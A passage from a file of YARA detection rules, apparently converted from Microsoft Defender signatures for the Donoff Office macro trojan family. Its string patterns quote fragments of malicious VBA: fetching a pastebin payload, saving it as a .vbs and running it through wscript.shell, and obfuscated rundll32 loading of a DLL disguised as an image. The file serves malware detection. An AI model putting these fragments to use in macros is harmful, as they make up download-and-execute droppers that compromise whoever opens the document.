        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {50 72 69 76 61 74 65 20 53 75 62 20 68 65 6c 6c 6f 57 6f 72 64 28 29 0d 0a 20 20 20 20 53 65 74 20 6f 62 6a 20 3d 20 47 65 74 4f 62 6a 65 63 74 28 22 6e 65 77 3a 43 30 38 41 46 44 39 30 2d 46 32 41 31 2d 31 31 44 31 2d 38 34 35 35 2d 30 30 41 30 43 39 31 46 33 38 38 30 22 29}  //weight: 1, accuracy: High
        $x_1_2 = {44 69 6d 20 [0-15] 0d 0a 20 20 20 20 00 20 3d 20 22 68 22 20 26 20 22 65 22 20 26 20 22 6c 22 20 26 20 22 6c 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_O97M_Donoff_RPM_2147816629_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:O97M/Donoff.RPM!MTB"
        threat_id = "2147816629"
        type = "Trojan"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "(\"https://pastebin.com/raw/rgulkfkl\"))adiag.savetofile\"bfvby.vbs\",2'savebinarydatatodiskcreateobject(\"wscript.shell\").run" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_O97M_Donoff_RDO_2147825109_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:O97M/Donoff.RDO!MTB"
        threat_id = "2147825109"
        type = "Trojan"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {67 65 74 6f 62 6a 65 63 74 28 22 6e 65 77 3a 66 39 33 35 64 63 32 32 2d 31 63 66 30 2d 31 31 64 30 2d 61 64 62 39 2d 30 30 63 30 34 66 64 35 38 61 30 62 22 29 2e 65 6e 76 69 72 6f 6e 6d 65 6e 74 28 22 70 72 6f 63 65 73 73 22 29 28 22 7b 66 63 66 32 33 38 32 61 2d 34 64 64 37 2d 34 66 62 65 2d 39 65 37 37 2d 30 65 65 33 64 64 36 36 33 37 39 61 7d 22 29 00 02 3d 22 67 76 6e 63 71 78 76 66 2e 70 78 6e 22 69 64 65 76 65 6e 74 3d 73 65 74 74 69 6d 65 72 28 30 2c 73 68 65 6c 6c 63 6f 64 65 2c 31 2c 73 68 65 6c 6c 63 6f 64 65 29 77 61 73 74 65 74 69 6d 65 31 6b 69 6c 6c 74 69 6d 65 72 30}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_O97M_Donoff_RR_2147952668_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:O97M/Donoff.RR!MTB"
        threat_id = "2147952668"
        type = "Trojan"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {76 62 61 2e 65 6e 76 69 72 6f 6e 28 22 61 6c 22 26 22 6c 75 73 65 22 26 22 72 73 70 72 22 26 22 6f 66 69 6c 65 22 29 26 22 2f 63 73 22 26 22 63 75 69 2e 64 22 26 22 6c 6c 22 [0-10] 3d 76 62 61 2e 65 6e 76 69 72 6f 6e 28 22 75 73 65 22 26 22 72 70 72 22 26 22 6f 66 69 6c 65 22 29 26 22 2f 70 69 63 22 26 22 74 75 72 65 73 2f 6b 22 26 22 6f 22 26 22 61 22 26 22 6c 22 26 22 61 2e 70 22 26 22 6e 67 22}  //weight: 1, accuracy: Low
        $x_1_2 = "vba.environ(\"wi\"&\"nd\"&\"ir\")&\"/sy\"&\"stem3\"&\"2/r\"&\"undl\"&\"l32.e\"&\"xe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

